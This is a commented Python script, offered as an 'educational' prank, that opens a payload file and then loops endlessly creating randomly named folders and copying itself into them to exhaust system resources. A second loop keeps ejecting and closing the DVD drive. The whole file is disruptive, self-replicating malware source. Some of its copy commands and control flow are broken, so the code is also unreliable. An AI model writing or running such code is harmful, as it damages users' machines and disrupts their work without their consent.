#WARNING!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#RUNNING THIS WILL CAUSE YOUR PC TO JAM BECAUSE THIS OVERLOADS THE RAM!!!!!!!!!!!!!!!!!!!!!!!
#CAUTION IS ADVISED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#FOR EDUCATIONAL  PURPOSES ONLY!

#Do not distribute!
#One can make this run without the CMD window open if it is saved as a .pyw
# a .pyw file is run with a different interpreter so there is no CMD window

#ARGV allows us to store CMD commands and then access them again
from sys import argv
import os
#ctypes is needed in order to open and close the DVDdrive
import ctypes
#allows timers
import time
#allows pseudo random integers and floats
import random

#script accesses the Argv librabry as a variable.
script = argv
#access the last input in the command console, that is needed to clone the files
name = str(script[0])
#starts the payload text file, stored as a variable
cmd = 'start payload.txt'
#enters the variable into the CMD command
os.system(cmd)
# this is a variable that is allways true so the loop can run indefinately.
x = 1

#Using the variable x this loop will run forever sine there are no breaks in it and the variable x is never changed. This is intentional.
while x==1:
	#Hexadecimal color code creator to make sure no folders have the same name. 
	#This Hexadecimal code is then used as a folder name and a new one is generated each loop.
	def gen_hex_colour_code():
		return ''.join([random.choice('0123456789ABCDEF') for x in range(6)])
	if __name__ == '__main__':
		print (gen_hex_colour_code())
	
	#Makes a new new directory within the original folder called: clone
	os.mkdir(gen_hex_colour_code())
	#Runs a copy command where the Payload text file is copied to the newly made directory
	os.system(r'copy textfile.txt' 'gen_hex_colour_code()')
	#Runs a copy command where the "replicator.py" is copied but it gets the name of the script from the ARGV
	#library that we imported. It gets that from the last inputted CMD command when this file was first started.
	os.system(r'copy ' + name + 'gen_hex_colour_code()')

#while loop to do the opening and closing of the DVDdrive.
#everything in this loop is ran on every iteration, That includes the creation of a new waitTime integers,
#that is done to not create a pattern where the diskdrive opens and closes regularly and is this more annoying.
# This while loop is always running because there are no parameters in order to not make the condition false.
while True:
	#Creates an integer between 1 and 5 and stored as a variable.
	waitTime = random.randint(1,5)
	# Open the DVDdrive
	ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
	#wait for 2 seconds
	time.sleep(2)
	#close the DVDdrive
	ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
	#Wait for however many seconds the "random" integer happens to be in this iteration of the loop.
	time.sleep(waitTime)
	
	